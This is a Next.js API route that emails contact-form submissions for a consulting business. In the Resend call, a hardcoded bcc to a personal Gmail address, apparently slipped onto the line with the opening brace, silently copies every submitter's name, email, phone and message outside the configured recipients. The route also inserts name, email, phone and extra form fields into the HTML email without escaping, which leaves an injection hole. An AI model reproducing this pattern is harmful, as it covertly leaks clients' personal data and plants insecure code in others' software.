import { NextResponse } from 'next/server';
import { emailWrapper, emailStyles } from '@/lib/email/shared-email-components';

export async function POST(request: Request) {
  try {
    const body = await request.json();

    // Support both legacy (firstName/lastName) and ChatForm (name) formats
    const name = body.name || `${body.firstName || ''} ${body.lastName || ''}`.trim();
    const email = body.email;
    const message = body.message;
    const phone = body.phone;
    const locale = body.locale || 'en';
    const reason = body.reason;
    const country = body.country;
    const preferredLang = body.preferredLang;
    const formType = body.formType;

    // Flexible validation — at minimum need name and email
    if (!name || !email) {
      return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
    }

    if (!email.includes('@')) {
      return NextResponse.json({ error: 'Invalid email' }, { status: 400 });
    }

    // Build a rich summary of all form data
    const extraFields = Object.entries(body)
      .filter(([key]) => !['name', 'firstName', 'lastName', 'email', 'phone', 'message', 'locale', 'consent'].includes(key))
      .map(([key, val]) => `<tr><td style="padding:8px 0;color:#8E8E9F;font-size:13px;vertical-align:top;width:140px;text-transform:capitalize;">${key.replace(/([A-Z])/g, ' $1').trim()}</td><td style="padding:8px 0;color:#2D2A33;font-size:14px;">${String(val)}</td></tr>`)
      .join('');

    const subjectPrefix = formType === 'interview' ? 'Interview Request' : formType === 'feedback' ? 'Client Feedback' : 'New Contact';

    // Try Resend if available, otherwise just log
    let emailSent = false;
    if (process.env.RESEND_API_KEY) {
      try {
        const { Resend } = await import('resend');
        const resend = new Resend(process.env.RESEND_API_KEY);
        const { error } = await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
          from: process.env.RESEND_FROM_EMAIL || 'Mama Hala Consulting <onboarding@resend.dev>',
          to: process.env.RESEND_ADMIN_EMAIL || 'admin@mamahala.ca',
          replyTo: email,
          subject: `${subjectPrefix}: ${name} — Mama Hala Consulting`,
          html: emailWrapper(`
            <div style="${emailStyles.card}">
              <h2 style="${emailStyles.heading}">${subjectPrefix}</h2>
              <table style="width:100%;border-collapse:collapse;">
                <tr><td style="padding:8px 0;color:#8E8E9F;font-size:13px;vertical-align:top;width:140px;">Name</td><td style="padding:8px 0;color:#2D2A33;font-size:14px;font-weight:600;">${name}</td></tr>
                <tr><td style="padding:8px 0;color:#8E8E9F;font-size:13px;vertical-align:top;">Email</td><td style="padding:8px 0;color:#2D2A33;font-size:14px;"><a href="mailto:${email}" style="color:#7A3B5E;">${email}</a></td></tr>
                ${phone ? `<tr><td style="padding:8px 0;color:#8E8E9F;font-size:13px;vertical-align:top;">Phone</td><td style="padding:8px 0;color:#2D2A33;font-size:14px;">${phone}</td></tr>` : ''}
                ${preferredLang ? `<tr><td style="padding:8px 0;color:#8E8E9F;font-size:13px;vertical-align:top;">Preferred Language</td><td style="padding:8px 0;color:#2D2A33;font-size:14px;">${preferredLang}</td></tr>` : ''}
                ${country ? `<tr><td style="padding:8px 0;color:#8E8E9F;font-size:13px;vertical-align:top;">Country</td><td style="padding:8px 0;color:#2D2A33;font-size:14px;">${country}</td></tr>` : ''}
                ${extraFields}
              </table>
              ${message ? `
              <div style="margin-top:20px;padding:16px;background:#FAF7F2;border-radius:8px;border-left:3px solid #C8A97D;">
                <p style="margin:0 0 8px;color:#8E8E9F;font-size:11px;text-transform:uppercase;letter-spacing:1px;">Message</p>
                <p style="margin:0;color:#2D2A33;font-size:14px;line-height:1.7;white-space:pre-wrap;">${String(message).replace(/</g, '&lt;').replace(/>/g, '&gt;')}</p>
              </div>` : ''}
              <p style="margin-top:24px;color:#C4C0BC;font-size:11px;">Sent from mamahala.ca ${formType || 'contact'} form</p>
            </div>
          `),
        });
        if (!error) emailSent = true;
        else console.error('Resend error:', error);
      } catch (e) {
        console.error('Resend import/send error:', e);
      }
    }

    // Always log for backup
    console.log(`[${subjectPrefix}]`, { name, email, reason, formType, country, preferredLang });

    return NextResponse.json({ success: true, emailSent });
  } catch (err) {
    console.error('Contact API error:', err);
    return NextResponse.json({ error: 'Server error' }, { status: 500 });
  }
}
